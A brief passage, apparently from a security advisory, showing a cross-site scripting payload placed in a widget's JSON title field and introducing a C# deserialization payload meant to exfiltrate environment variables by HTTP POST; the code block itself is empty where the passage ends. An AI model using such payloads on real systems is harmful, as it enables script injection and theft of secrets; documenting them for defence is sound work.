Injecting a script payload within a data field expected by the widget, e.g.:
{
  type: 'some_widget_data',
  payload: {
    title: '<script>alert(document.domain)</script>'
  }
}

The following C# code snippet demonstrates payload generation for a SortedSet object to exfiltrate environment variables via HTTP POST:

```csharp
